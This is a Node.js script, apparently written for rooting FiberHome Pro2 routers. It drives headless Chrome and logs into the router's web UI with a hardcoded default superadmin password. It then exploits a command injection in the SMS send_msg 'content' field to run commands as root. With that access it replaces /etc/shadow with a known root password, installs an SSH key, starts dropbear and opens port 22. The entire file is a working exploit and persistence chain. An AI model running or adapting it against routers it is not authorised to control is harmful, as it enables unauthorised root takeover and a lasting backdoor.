// enable_ssh.js - 烽火 Pro2 一键开通 SSH（完整流程）
// 原理: send_msg content 双引号注入 → ROOT RCE → shadow/root 目录 bind mount → dropbear
// 用法: node enable_ssh.js [--pubkey "ssh-ed25519 AAAA... comment"]
// 依赖: Node.js + Chrome/Edge
const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const ROUTER = process.env.ROUTER_IP || '192.168.66.1';
const WEB_USER = process.env.FH_USER || 'superadmin';
const WEB_PASS = process.env.FH_PASS || 'F1ber$dm';
const SSH_PASS = 'root123';
// root123 的 MD5-crypt hash, salt=ab (musl libc 只支持 $1$)
const SHADOW_HASH = '$1$ab$Wi/974lO6VjwDTjC3WY1o1';
const CHROME = process.env.CHROME_PATH
    || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';

// 解析公钥参数
let PUB_KEY = null;
const pkIdx = process.argv.indexOf('--pubkey');
if (pkIdx > -1 && process.argv[pkIdx + 1]) {
    PUB_KEY = process.argv[pkIdx + 1];
} else {
    // 默认尝试读取本地 router_key.pub
    const localPub = path.join(__dirname, 'router_key.pub');
    if (fs.existsSync(localPub)) PUB_KEY = fs.readFileSync(localPub, 'utf8').trim();
}

async function main() {
    const chrome = spawn(CHROME, [
        '--headless=new', '--disable-gpu', '--no-sandbox', '--disable-dev-shm-usage',
        '--remote-debugging-pipe', '--no-first-run', '--no-default-browser-check', 'about:blank'
    ], { stdio: ['pipe', 'pipe', 'pipe', 'pipe', 'pipe'] });

    const cdpIn = chrome.stdio[3];
    const cdpOut = chrome.stdio[4];
    let buffer = '';
    const pending = {};
    let nextId = 1;

    cdpOut.on('data', (data) => {
        buffer += data.toString('utf8');
        const messages = buffer.split('\0');
        buffer = messages.pop();
        for (const msg of messages) {
            if (!msg.trim()) continue;
            try {
                const parsed = JSON.parse(msg);
                if (parsed.id && pending[parsed.id]) {
                    pending[parsed.id](parsed);
                    delete pending[parsed.id];
                }
            } catch (e) { }
        }
    });

    function send(method, params = {}, sessionId) {
        return new Promise((resolve) => {
            const id = nextId++;
            const msg = { id, method, params };
            if (sessionId) msg.sessionId = sessionId;
            pending[id] = resolve;
            cdpIn.write(JSON.stringify(msg) + '\0');
        });
    }

    let sid;
    async function evaluate(expr, sessionId) {
        const r = await send('Runtime.evaluate', {
            expression: expr, returnByValue: true, awaitPromise: true
        }, sessionId ?? sid);
        return r.result?.result?.value ?? JSON.stringify(r.result);
    }

    // 通过短信注入执行命令，返回命令输出
    async function exec(shCmd) {
        const content = `x";${shCmd};echo "`;
        const expr = `new Promise(function(res) {
            $post("send_msg", {recv_number: "10000", encode_schema: "GSM_8BIT", content: ${JSON.stringify(content)}})
                .then(function(d) { res(JSON.stringify(d)); })
                .catch(function(e) { res(JSON.stringify({error: String(e)})); });
        })`;
        const raw = await evaluate(expr, sid);
        try {
            const parsed = JSON.parse(raw);
            if (parsed.result) {
                let out = parsed.result;
                if (out.startsWith('3\n')) out = out.substring(2);
                if (out.endsWith('\n')) out = out.slice(0, -1);
                return out;
            }
            return raw;
        } catch (e) { return raw; }
    }

    // ========== 1. 登录 ==========
    const targets = await send('Target.getTargets');
    const createResult = await send('Target.createTarget', { url: 'about:blank' });
    const attachResult = await send('Target.attachToTarget', {
        targetId: createResult.result.targetId, flatten: true
    });
    sid = attachResult.result.sessionId;

    await send('Network.enable', {}, sid);
    await send('Runtime.enable', {}, sid);
    await send('Page.enable', {}, sid);

    console.log(`[*] Loading http://${ROUTER}/login.html ...`);
    await send('Page.navigate', { url: `http://${ROUTER}/login.html` }, sid);
    await new Promise(r => setTimeout(r, 12000));

    console.log('[*] Web login as superadmin...');
    const loginResult = await evaluate(`new Promise(function(res) {
        $post("DO_WEB_LOGIN", {username: ${JSON.stringify(WEB_USER)}, password: ${JSON.stringify(WEB_PASS)}})
            .then(function(d) { res(JSON.stringify(d)); })
            .catch(function(e) { res(JSON.stringify({error: String(e)})); });
    })`);
    console.log(`    → ${loginResult}`);
    await new Promise(r => setTimeout(r, 1000));

    // ========== 2. 验证 ROOT ==========
    console.log('[*] Verifying root via SMS injection...');
    console.log(`    → ${await exec('id')}`);
    await new Promise(r => setTimeout(r, 500));

    // ========== 3. 设置 SSH 密码 ==========
    console.log('[*] Writing shadow (password: root123)...');
    // printf 单引号保护 hash 中的 $; %s 后接 \n 保证换行
    const shadowCmd = `printf 'root:%s:18673:0:99999:7:::\\ndaemon:*:0:0:99999:7:::\\nnobody:*:0:0:99999:7:::\\nsshd:*:0:0:99999:7:::\\n' '${SHADOW_HASH}' > /tmp/shadow_new`;
    console.log(`    → ${await exec(shadowCmd)}`);
    await new Promise(r => setTimeout(r, 500));
    console.log(`    shadow_new: ${await exec('head -1 /tmp/shadow_new')}`);
    await new Promise(r => setTimeout(r, 500));

    console.log('[*] Bind-mounting /etc/shadow...');
    console.log(`    → ${await exec('umount /etc/shadow 2>/dev/null; mount --bind /tmp/shadow_new /etc/shadow && echo OK')}`);
    await new Promise(r => setTimeout(r, 500));
    console.log(`    /etc/shadow: ${await exec('head -1 /etc/shadow')}`);
    await new Promise(r => setTimeout(r, 500));

    // ========== 4. 配置 authorized_keys ==========
    if (PUB_KEY) {
        console.log('[*] Setting up SSH key auth...');
        await exec('mkdir -p /data/root_home/.ssh');
        await new Promise(r => setTimeout(r, 300));

        // printf '%s\n' '公钥' —— 单引号保护; 末尾必须换行
        const keyCmd = `printf '%s\\n' '${PUB_KEY.replace(/'/g, "'\\''")}' > /data/root_home/.ssh/authorized_keys`;
        console.log(`    → ${await exec(keyCmd)}`);
        await new Promise(r => setTimeout(r, 500));

        await exec('chmod 700 /data/root_home/.ssh; chmod 600 /data/root_home/.ssh/authorized_keys');
        await new Promise(r => setTimeout(r, 300));

        // bind mount /root (只读 squashfs) → /data/root_home (可写)
        console.log('[*] Bind-mounting /root → /data/root_home...');
        console.log(`    → ${await exec('umount /root 2>/dev/null; mount --bind /data/root_home /root && echo OK')}`);
        await new Promise(r => setTimeout(r, 500));
        console.log(`    verify: ${await exec('ls -la /root/.ssh/authorized_keys')}`);
        await new Promise(r => setTimeout(r, 500));
    }

    // ========== 5. 启动 dropbear ==========
    console.log('[*] Generating host key (if needed)...');
    console.log(`    → ${await exec('ls /tmp/dkey 2>/dev/null || dropbearkey -t rsa -f /tmp/dkey 2>&1 | tail -1')}`);
    await new Promise(r => setTimeout(r, 2000));

    console.log('[*] Starting dropbear on port 22...');
    console.log(`    → ${await exec('kill $(pidof dropbear) 2>/dev/null; dropbear -p 22 -r /tmp/dkey 2>&1; sleep 0.3; pidof dropbear')}`);
    await new Promise(r => setTimeout(r, 1500));

    // ========== 6. 防火墙 ==========
    console.log('[*] Opening firewall port 22...');
    console.log(`    → ${await exec('iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT; echo OK')}`);
    await new Promise(r => setTimeout(r, 500));

    // ========== 7. 验证 ==========
    console.log('\n[=] ========== 最终状态 ========== ');
    console.log(`    dropbear PID : ${await exec('pidof dropbear')}`);
    await new Promise(r => setTimeout(r, 300));
    console.log(`    port 22      : ${await exec('netstat -tln | grep :22 || ss -tln | grep :22')}`);
    await new Promise(r => setTimeout(r, 300));
    console.log(`    shadow hash  : ${await exec('head -1 /etc/shadow')}`);
    await new Promise(r => setTimeout(r, 300));
    console.log(`    auth_keys    : ${await exec('cat /root/.ssh/authorized_keys 2>/dev/null | head -c 60 || echo N/A')}`);
    await new Promise(r => setTimeout(r, 300));

    console.log('\n[+] SSH 已开通！');
    console.log(`    ssh root@${ROUTER}   (密码: ${SSH_PASS})`);
    if (PUB_KEY) console.log('    或使用密钥登录');

    chrome.kill();
    process.exit(0);
}

main().catch(e => { console.error(e); process.exit(1); });
